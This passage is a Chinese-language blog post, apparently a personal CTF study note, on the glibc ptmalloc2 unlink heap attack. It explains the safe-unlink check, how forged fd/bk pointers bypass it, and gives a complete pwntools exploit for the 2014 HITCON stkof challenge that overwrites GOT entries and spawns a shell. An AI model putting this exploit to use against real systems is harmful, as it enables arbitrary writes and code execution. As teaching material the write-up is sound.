@@ -1,0 +1,945 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/sakura.png">
+  <link rel="icon" href="/img/sakura.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="花時雨">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Overview unlink俗称脱链，就是将链表头处的free堆块从unsorted bin中脱离出来，然后和物理地址相邻的新free的堆块合并成大堆块(向前合并或向后合并)，再放入到unsorted bin中。 危害原理：通过伪造free状态的fake_chunk，伪造fd和bk指针，通过绕过unlink的检测实现unlink使其往p所在的位置写入p-0x18，从而实现任意地址写的漏洞。 漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink学习记录">
+<meta property="og:url" content="https://hanashigure.github.io/2026/02/11/heap-ptmalloc2-unlink/index.html">
+<meta property="og:site_name" content="花時雨的流水账">
+<meta property="og:description" content="Overview unlink俗称脱链，就是将链表头处的free堆块从unsorted bin中脱离出来，然后和物理地址相邻的新free的堆块合并成大堆块(向前合并或向后合并)，再放入到unsorted bin中。 危害原理：通过伪造free状态的fake_chunk，伪造fd和bk指针，通过绕过unlink的检测实现unlink使其往p所在的位置写入p-0x18，从而实现任意地址写的漏洞。 漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hanashigure.github.io/images/heap-ptmalloc2-unlink/unlinkc.png">
+<meta property="article:published_time" content="2026-02-11T04:28:00.000Z">
+<meta property="article:modified_time" content="2026-03-07T14:53:50.456Z">
+<meta property="article:author" content="花時雨">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="堆">
+<meta property="article:tag" content="unlink">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://hanashigure.github.io/images/heap-ptmalloc2-unlink/unlinkc.png">
+  
+  
+  
+  <title>Unlink学习记录 - 花時雨的流水账</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"hanashigure.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>花時雨的流水账</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Unlink学习记录"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-11 12:28" pubdate>
+          2026年2月11日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Unlink学习记录</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ol>
+<li>unlink俗称脱链，就是将链表头处的free堆块从unsorted bin中脱离出来，然后和<strong>物理地址相邻</strong>的新free的堆块合并成大堆块(向前合并或向后合并)，再放入到unsorted bin中。</li>
+<li>危害原理：通过伪造free状态的fake_chunk，伪造<code>fd</code>和<code>bk</code>指针，通过绕过unlink的检测实现unlink使其往p所在的位置写入p-0x18，从而实现<strong>任意地址写</strong>的漏洞。</li>
+<li>漏洞产生原因：<code>Offbynull</code>、<code>offbyone</code>、堆溢出，原因是修改了堆块的使用标志位。</li>
+</ol>
+<h3 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*malloc.c  int_free函数中*/</span><br><span class="hljs-comment">/*这里p指向当前malloc_chunk结构体*/</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = p-&gt;prev_size;<br>      size += prevsize;<br><span class="hljs-comment">//修改指向当前chunk的指针，指向前一个chunk。</span><br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize)); <br>     <br>      unlink(p, bck, fwd);<br>&#125;   <br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><p>进行判断：看当前堆块中<code>p</code>这个标志位，如果<code>p</code>设置为0则为free状态，则进行unlink，否则反之；</p>
+</li>
+<li><p>先提取prev_size，然后当前size+prev_size，此时指针会指向当前chunk的前一个堆块，合并后的指针地址为：free的堆块地址 - 前一个chunk大小，此时<code>p</code>指针则会从现在的堆块跳到前一个堆块；</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">prevsize = p-&gt;prev_size;<br>size += prevsize;  <br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>最后是将这个堆块和相邻的(这里是上一个)一起unlink。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//相关函数说明：</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s))) </span><br><span class="hljs-comment">/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    FD = P-&gt;fd;                                   \</span><br><span class="hljs-meta">    BK = P-&gt;bk;                                   \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      </span><br>             malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>    FD-&gt;bk = BK;                                  \<br>    BK-&gt;fd = FD;                                  \<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>unlink函数是如何定义的：</p>
+<ol>
+<li><p>从合并后新指针地址中提取出<code>fd</code>指针和<code>bk</code>指针作为临时变量；</p>
+</li>
+<li><p>这里有一个check，检查FD的bk和BK的fd是否指向当前堆块，若不通过则不进行unlink;</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      <br>   	malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>通过后会把BK赋值给FD的bk，把FD赋值给BK的fd。</li>
+</ol>
+<p><img src="/images/heap-ptmalloc2-unlink/unlinkc.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="unlink的绕过和利用"><a href="#unlink的绕过和利用" class="headerlink" title="unlink的绕过和利用"></a>unlink的绕过和利用</h2><p>我们伪造如下信息：</p>
+<ol>
+<li>chunk &#x3D; 0x0602280 (P是将要合并到的堆地址，P存在chunk中，相当于 <code>*chunk = P</code>)</li>
+<li>P_fd &#x3D; chunk - 0x18 &#x3D; 0x0602268</li>
+<li>P_bk &#x3D; chunk - 0x10 &#x3D; 0x0602270</li>
+</ol>
+<blockquote>
+<p>我在学习的过程中此处卡住了，对于为什么是减去<code>0x18</code>和<code>0x10</code>这两个值我们在此复习一下为什么是减去<code>0x18</code>和<code>0x10</code>，在 glibc 的 malloc 实现（ptmalloc）中，<strong>在释放前、不在 bin 中时</strong>，chunk 结构为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>    <span class="hljs-type">size_t</span>      prev_size;  <span class="hljs-comment">// 0x00 偏移（如果前一个块空闲，才有用）</span><br>    <span class="hljs-type">size_t</span>      size;       <span class="hljs-comment">// 0x08 偏移（包含标志位）</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>   <span class="hljs-comment">// 0x10 偏移（仅在 bin 中使用）</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span>   <span class="hljs-comment">// 0x18 偏移</span><br>    <span class="hljs-comment">// ... 更后面还有 fd_nextsize, bk_nextsize（large bin）</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>而回顾上面的内容有这样的一条：”通过后会把BK赋值给FD的bk，把FD赋值给BK的fd。”</p>
+</blockquote>
+<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">define <span class="hljs-title function_">unlink</span><span class="hljs-params">(P, BK, FD)</span> &#123;                                            \<br>    FD = P-&gt;fd;                                   \FD = <span class="hljs-number">0x602268</span><br>    BK = P-&gt;bk;                                   \BK = <span class="hljs-number">0x602270</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))    \FD-&gt;bk  = *(<span class="hljs-number">0x602268</span>+<span class="hljs-number">0x18</span>) | *(<span class="hljs-number">0x602280</span>) = P <br>	\ BK-&gt;fd = *(<span class="hljs-number">0x602270</span>+<span class="hljs-number">0x10</span>) = *(<span class="hljs-number">0x602280</span>) = P ,绕过！              <br>             malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>    FD-&gt;bk = BK;                                  \*(<span class="hljs-number">0x602268</span>+<span class="hljs-number">0x18</span>) | *(<span class="hljs-number">0x602280</span>)  = <span class="hljs-number">0x602270</span><br>    BK-&gt;fd = FD;                                  \ *(<span class="hljs-number">0x602270</span>+<span class="hljs-number">0x10</span>) | *(<span class="hljs-number">0x602280</span>) = <span class="hljs-number">0x602268</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>绕过检查可以总结成：$FD-&gt;bk &#x3D;&#x3D; P$ 和 $BK-&gt;fd &#x3D;&#x3D; P$，等价于： $<em>(P_fd + 0x18) &#x3D;&#x3D; P$ 和 $</em>(P_bk + 0x10) &#x3D;&#x3D; P$</li>
+<li>可以构造成</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">P_fd = P - 0x18<br>P_bk = P - 0x10<br></code></pre></td></tr></table></figure>
+
+<p>即：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">FD = P - 0x18<br>FD-&gt;bk = (P - 0x18) + 0x18 = P → 内容等于 P（绕过）<br><br>BK = P - 0x10<br>BK-&gt;fd = (P - 0x10) + 0x10 = P → 内容等于 P（绕过）<br></code></pre></td></tr></table></figure>
+
+<p>总结起来就是：<strong>让 <code>P-&gt;fd</code> 指向 <code>P - 0x18</code>，<code>P-&gt;bk</code> 指向 <code>P - 0x10</code>，就能绕过 <code>FD-&gt;bk == P</code> 和 <code>BK-&gt;fd == P</code> 检查，并使 <code>\*P</code> 被覆写为 <code>P - 0x18</code>。</strong></p>
+<h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><ol>
+<li>堆布局</li>
+<li>伪造 fake chunk</li>
+<li>fd&#x2F;bk &#x3D; ptr-0x18&#x2F;ptr-0x10</li>
+<li>修改 next chunk 的 prev_size&#x2F;size</li>
+<li>unlink 写全局指针</li>
+<li>写 GOT 表项</li>
+<li>先 leak 后 getshell</li>
+</ol>
+<p><strong>EXP：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="hljs-comment">#sh = process(&quot;./stkof&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25830</span>)<br>stkof = ELF(<span class="hljs-string">&#x27;./stkof&#x27;</span>)<br>head = <span class="hljs-number">0x602140</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sh.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br>    sh.recvuntil(<span class="hljs-string">b&#x27;OK\n&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>    sh.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br>    sh.send(content)<br>    sh.recvuntil(<span class="hljs-string">&#x27;OK\n&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sh.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br>malloc(<span class="hljs-number">0x100</span>)   <br>malloc(<span class="hljs-number">0x30</span>)    <br>malloc(<span class="hljs-number">0x80</span>)   <br><br>payload = p64(<span class="hljs-number">0</span>)        <span class="hljs-comment">#pre_size = 0</span><br>payload += p64(<span class="hljs-number">0x20</span>)    <span class="hljs-comment">#fake size</span><br>payload += p64(head + <span class="hljs-number">0x10</span> - <span class="hljs-number">0x18</span>) <br>payload += p64(head + <span class="hljs-number">0x10</span> - <span class="hljs-number">0x10</span>) <br>payload += p64(<span class="hljs-number">0x20</span>)    <br><br>payload = payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(<span class="hljs-number">0x30</span>)   <br><br>payload += p64(<span class="hljs-number">0x90</span>)    <br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(payload), payload) <br><br>free(<span class="hljs-number">3</span>) <br>sh.recvuntil(<span class="hljs-string">&#x27;OK\n&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p64(stkof.got[<span class="hljs-string">&#x27;free&#x27;</span>]) + p64(stkof.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(stkof.got[<span class="hljs-string">&#x27;atoi&#x27;</span>])<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload2),payload2)   <br>payload3 = p64(stkof.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload3),payload3)    <br><br>free(<span class="hljs-number">1</span>)                     <br><br>puts_addr = u64(sh.recvuntil(<span class="hljs-string">&#x27;\nOK\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))    <br><span class="hljs-comment">#</span><br><span class="hljs-comment"># libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="hljs-comment"># binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="hljs-comment"># system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="hljs-comment">#</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload4 = p64(system_addr)<br>binsh_addr =libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(payload4), payload4)<br>sh.send(p64(binsh_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><p>CTF-Wiki</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#2014-hitcon-stkof">Unlink</a></li>
+</ul>
+</li>
+<li><p>CSDN</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/108481889?spm=1001.2014.3001.5502">好好说话之unlink</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fzucaicai/article/details/129705468">堆溢出——unlink漏洞攻击（bamboobox）</a></li>
+</ul>
+</li>
+<li><p>博客园</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lordtianqiyi/articles/16345374.html">堆漏洞之unlink &amp; 2014 HITCON stkof</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nemuzuki/p/17286811.html">堆块chunk介绍&amp;堆溢出漏洞的unlink利用原理</a></li>
+</ul>
+</li>
+<li><p>Blogs</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://iyheart.github.io/2024/10/11/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unlink/">PWN堆unlink</a></li>
+<li><a target="_blank" rel="noopener" href="https://jimi-lab.github.io/2025/08/18/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/">堆溢出利用</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.nan0in27.cn/p/%E5%A0%86%E6%BA%A2%E5%87%BAunlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BBbuu%E4%B8%BE%E4%BE%8B/">堆溢出——unlink漏洞攻击（buu举例）</a></li>
+<li><a target="_blank" rel="noopener" href="https://zicai.github.io/wooyun_articles/drops/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html">堆溢出的unlink利用方法</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/acama/acez.re/blob/main/CTF%20Writeup%20-%20HITCON%20CTF%202014%20stkof%20or%20the%20%22unexploitable%22%20heap%20overflow%20%3F.md">CTF Writeup - HITCON CTF 2014 stkof or the “unexploitable” heap overflow ?</a></li>
+</ul>
+</li>
+<li><p>先知</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/5361">堆入门—unlink的理解和各种题型总结</a></li>
+</ul>
+</li>
+<li><p>看雪</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-289464.htm">堆学习：Unlink attack</a></li>
